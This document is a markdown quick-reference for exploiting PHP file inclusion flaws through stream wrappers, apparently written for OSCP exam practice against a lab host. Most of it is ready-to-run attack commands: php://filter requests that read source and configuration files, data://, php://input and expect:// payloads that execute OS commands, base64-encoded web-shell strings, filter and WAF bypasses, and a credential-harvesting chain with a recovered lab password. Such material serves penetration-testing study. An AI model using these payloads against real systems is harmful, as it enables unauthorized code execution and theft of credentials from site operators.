# PHP Wrappers Quick Reference Guide

## Overview
PHP wrappers provide access to various I/O streams. Can be used to bypass filters, read source code, and achieve code execution through file inclusion vulnerabilities.

## Common PHP Wrappers

### php://filter - Read Without Execution
Reads file contents without executing PHP code. Perfect for source code disclosure.

### data:// - Direct Code Execution
Embeds data directly in the stream. Requires `allow_url_include=On`.

### php://input - POST Data Stream
Reads raw POST data. Useful for code execution via POST requests.

### expect:// - Command Execution
Direct command execution (requires expect extension).

### phar:// - PHP Archive
Includes files from PHP archives.

## php://filter Wrapper

### Basic Syntax
```
php://filter/[read=filter]/[write=filter]/resource=file
```

### Source Code Disclosure
```bash
# Base64 encode to prevent execution
curl "http://192.168.133.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
# Purpose: Read PHP source without execution
# convert.base64-encode: Encoding filter
# resource=: Target file to read

# Decode the output
echo "BASE64_STRING" | base64 -d
# -d: Decode flag
# Result: PHP source code with passwords/logic
```

### Real Example - Found MySQL Credentials
```bash
# Request
curl "http://192.168.133.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php"

# Response (base64)
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4K...

# Decoded
echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4K..." | base64 -d
# Found: $password = "M00nK4keCard!2#";
```

### Filter Chains & Variations
```bash
# ROT13 encoding
curl "http://TARGET/index.php?page=php://filter/read=string.rot13/resource=config.php"
# Decode: echo "OUTPUT" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Multiple filters (chain)
curl "http://TARGET/index.php?page=php://filter/convert.base64-encode/convert.base64-encode/resource=file.php"
# Double encoded - decode twice

# Zlib compression
curl "http://TARGET/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=file.php"

# Strip tags (remove HTML)
curl "http://TARGET/index.php?page=php://filter/string.strip_tags/resource=file.php"

# Convert to uppercase
curl "http://TARGET/index.php?page=php://filter/string.toupper/resource=file.php"
```

### Reading Different File Types
```bash
# Absolute path
curl "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd"

# Relative path
curl "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=../config.php"

# Current directory
curl "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=./database.php"

# Without filter (may execute)
curl "http://TARGET/index.php?page=php://filter/resource=test.txt"
```

## data:// Wrapper

### Requirements
- `allow_url_include` must be `On`
- Works with LFI/RFI vulnerabilities

### Plaintext PHP Execution
```bash
# Basic execution
curl "http://192.168.133.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
# data://text/plain: MIME type declaration
# %20: URL encoded space
# system(): PHP function for OS commands

# With command parameter
curl "http://TARGET/index.php?page=data://text/plain,<?php%20echo%20system(\$_GET['cmd']);?>&cmd=whoami"
# \$_GET: Escaped $ in bash
# &cmd=: Additional parameter
```

### Base64 Encoded Execution (Bypass Filters)
```bash
# Create payload
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
# Output: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
# -n: No newline (critical!)

# Execute base64 payload
curl "http://192.168.133.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=id"
# ;base64,: Indicates base64 data
# Bypasses filters blocking "system" keyword
```

### Real Examples - Successful Exploitation
```bash
# Example 1: Direct command execution
curl "http://192.168.133.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
# Result: Linux bffec6f1842d 5.4.0-212-generic

# Example 2: Flexible command execution
curl "http://192.168.133.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=whoami"
# Result: www-data
```

### Advanced data:// Techniques
```bash
# Include PHP code from data
curl "http://TARGET/index.php?page=data://text/plain,<?php%20phpinfo();?>"

# Multi-line PHP code (base64)
echo -n '<?php
$output = shell_exec("ls -la");
echo "<pre>$output</pre>";
?>' | base64
# Use resulting base64 in data:// wrapper

# Using eval for dynamic code
curl "http://TARGET/index.php?page=data://text/plain,<?php%20eval(\$_GET['code']);?>&code=phpinfo();"
```

## php://input Wrapper

### POST Request Execution
```bash
# Send PHP code in POST body
curl -X POST -d '<?php system("id"); ?>' "http://TARGET/index.php?page=php://input"
# -X POST: HTTP method
# -d: Data to send

# More complex payload
curl -X POST -d '<?php $cmd=$_GET["cmd"]; system($cmd); ?>' "http://TARGET/index.php?page=php://input&cmd=ls"

# With file upload simulation
curl -X POST -H "Content-Type: application/x-php" \
  -d '<?php passthru("cat /etc/passwd"); ?>' \
  "http://TARGET/index.php?page=php://input"
```

## expect:// Wrapper

### Direct Command Execution
```bash
# Requires PHP expect extension
curl "http://TARGET/index.php?page=expect://id"
curl "http://TARGET/index.php?page=expect://ls%20-la"
```

## phar:// Wrapper

### PHP Archive Inclusion
```bash
# Include file from PHAR
curl "http://TARGET/index.php?page=phar://archive.phar/file.php"

# Upload and execute PHAR
curl "http://TARGET/index.php?page=phar://uploads/shell.phar/exec.php"
```

## Attack Chains

### Chain 1: Source Code Review → Credential Discovery
```bash
# Step 1: Read config file
curl "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=config.php" | \
  grep -o '[A-Za-z0-9+/]\{50,\}=*' | base64 -d > config.txt

# Step 2: Extract credentials
grep -E "(password|passwd|pwd|pass)" config.txt

# Step 3: Try credentials on SSH/MySQL/Admin panels
```

### Chain 2: Filter Bypass → Code Execution
```bash
# When "system" is blocked, use base64
PAYLOAD=$(echo -n '<?php system($_GET["x"]);?>' | base64)
curl "http://TARGET/index.php?page=data://text/plain;base64,$PAYLOAD&x=id"
```

### Chain 3: Enumeration → Exploitation
```bash
# Find readable files
for file in index config database connection db settings; do
  curl -s "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=$file.php" | \
    base64 -d 2>/dev/null | grep -q "<?php" && echo "Found: $file.php"
done
```

## Bypassing Protections

### WAF/Filter Bypasses
```bash
# Case variations
php://Filter  # Capital F
PHP://filter  # All caps
PhP://filter  # Mixed case

# Alternative encoding for data://
data:text/plain,<?php%20system($_GET[chr(99).chr(109).chr(100)]);?>  # 'cmd' as chr()

# Unicode encoding
data://text/plain,\u003C\u003Fphp\u0020system('id');\u003F\u003E

# Double URL encoding
%2570hp://filter  # %25 = %, %70 = p
```

### Extension Restrictions
```bash
# If .php is blocked, try:
php://filter/convert.base64-encode/resource=file.php5
php://filter/convert.base64-encode/resource=file.phtml
php://filter/convert.base64-encode/resource=file.inc
```

## Detection Commands

### Check for Vulnerable Parameters
```bash
# Test each parameter
for param in page file include template; do
  echo "Testing: $param"
  curl -s "http://TARGET/index.php?$param=php://filter/convert.base64-encode/resource=index.php" | \
    grep -q "PD9" && echo "[+] Vulnerable: $param"
done
```

### Check allow_url_include Setting
```bash
# Method 1: Via phpinfo
curl "http://TARGET/index.php?page=data://text/plain,<?php%20phpinfo();?>" | grep allow_url_include

# Method 2: Test data:// wrapper
curl "http://TARGET/index.php?page=data://text/plain,<?php%20echo%20'test';?>" | grep -q "test" && \
  echo "allow_url_include is ON" || echo "allow_url_include is OFF"
```

## Quick Reference Table

| Wrapper | Purpose | Requires | Example |
|---------|---------|----------|---------|
| php://filter | Read files | PHP | `?page=php://filter/convert.base64-encode/resource=file.php` |
| data:// | Execute code | allow_url_include | `?page=data://text/plain,<?php%20system('id');?>` |
| php://input | POST execution | PHP | POST: `<?php system('id'); ?>` |
| expect:// | Direct commands | expect extension | `?page=expect://ls` |
| phar:// | Archive files | PHP | `?page=phar://archive.phar/file.php` |

## Command Flag Reference

### curl Flags
```bash
-s         # Silent mode (no progress bar)
-X POST    # Specify HTTP method
-d         # POST data
-H         # Add header
-o         # Output to file
-L         # Follow redirects
```

### base64 Flags
```bash
-d         # Decode
-w0        # No line wrapping (encode)
-n         # No newline with echo
```

### Common URL Encodings
```
Space  →  %20 or +
<      →  %3C
>      →  %3E
?      →  %3F
&      →  %26
$      →  %24
#      →  %23
/      →  %2F
\      →  %5C
```

## OSCP Exam Tips

1. **Try php://filter first** - Works even without allow_url_include
2. **Always decode base64** - May contain passwords or flags
3. **Test both absolute and relative paths** - Different apps handle differently
4. **Document wrapper syntax exactly** - Easy to make typos
5. **If data:// works** - allow_url_include is on, try RFI too
6. **Check source code for**:
   - Database credentials
   - Hidden parameters
   - Include file logic
   - Other vulnerable endpoints
7. **Use base64 encoding to bypass**:
   - Keyword filters (system, exec)
   - Special character restrictions
   - WAF rules

## Successful Exploitation Examples from Session

```bash
# Found MySQL credentials via php://filter
curl "http://192.168.133.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
# Decoded: $username = "root"; $password = "M00nK4keCard!2#";

# Retrieved kernel version via data://
curl "http://192.168.133.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
# Result: Linux 5.4.0-212-generic

# Both plaintext and base64 data:// worked
curl "http://192.168.133.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=whoami"
# Result: www-data with sudo privileges
```